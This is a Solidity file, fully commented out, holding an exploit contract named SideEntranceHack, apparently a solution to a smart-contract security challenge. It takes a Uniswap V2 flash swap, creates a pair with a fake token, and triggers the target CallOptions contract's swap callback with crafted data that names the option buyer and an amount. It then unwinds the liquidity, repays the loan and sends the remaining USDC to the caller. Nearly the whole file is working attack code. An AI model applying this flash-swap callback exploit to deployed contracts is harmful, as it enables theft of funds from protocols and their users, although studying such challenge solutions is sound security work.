// pragma solidity ^0.8.0;

// import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
// import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
// import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
// import "../side-entrance/CallOptions.sol";

// contract SideEntranceHack {
//     function run(
//         IUniswapV2Pair pair,
//         uint256 amount,
//         bytes32 optionId,
//         IERC20 usdc,
//         IERC20 fake,
//         IUniswapV2Router02 router,
//         IUniswapV2Factory factory,
//         CallOptions options
//     ) external {
//         bytes memory data = abi.encode(
//             usdc,
//             fake,
//             router,
//             factory,
//             options,
//             optionId,
//             msg.sender
//         );
//         pair.swap(amount, 0, address(this), data);
//     }

//     function uniswapV2Call(
//         address, /*_sender*/
//         uint256 _amount0,
//         uint256, /*_amount1*/
//         bytes calldata _data
//     ) external {
//         (
//             IERC20 usdc,
//             IERC20 fake,
//             IUniswapV2Router02 router,
//             IUniswapV2Factory factory,
//             CallOptions options,
//             bytes32 optionId,
//             address to
//         ) = abi.decode(
//                 _data,
//                 (
//                     IERC20,
//                     IERC20,
//                     IUniswapV2Router02,
//                     IUniswapV2Factory,
//                     CallOptions,
//                     bytes32,
//                     address
//                 )
//             );

//         usdc.approve(address(router), _amount0);
//         fake.approve(address(router), _amount0);

//         (, , uint256 liquidity) = router.addLiquidity(
//             address(usdc),
//             address(fake),
//             _amount0,
//             _amount0,
//             0,
//             0,
//             address(this),
//             block.timestamp
//         );

//         IUniswapV2Pair fakePair = IUniswapV2Pair(
//             factory.getPair(address(usdc), address(fake))
//         );

//         address optionBuyer = options.getBuyer(optionId);
//         bytes memory exploitData = abi.encode(
//             optionId,
//             optionBuyer,
//             94_000 * 1e18
//         );

//         uint256 amount0Out = fakePair.token0() == address(usdc)
//             ? _amount0 - 1
//             : 0;
//         uint256 amount1Out = amount0Out == 0 ? _amount0 - 1 : 0;

//         fakePair.swap(amount0Out, amount1Out, address(options), exploitData);

//         IERC20(address(fakePair)).approve(address(router), liquidity);

//         router.removeLiquidity(
//             address(usdc),
//             address(fake),
//             liquidity,
//             0,
//             0,
//             address(this),
//             block.timestamp * 2
//         );

//         uint256 repayAmount = calculateRepay(_amount0);
//         usdc.transfer(msg.sender, repayAmount);
//         usdc.transfer(to, usdc.balanceOf(address(this)));
//     }

//     function calculateRepay(uint256 amount) private pure returns (uint256) {
//         uint256 num = amount * (10**18) * 1000;
//         uint256 x = num / 997 / 10**18;
//         return x + 1;
//     }
// }
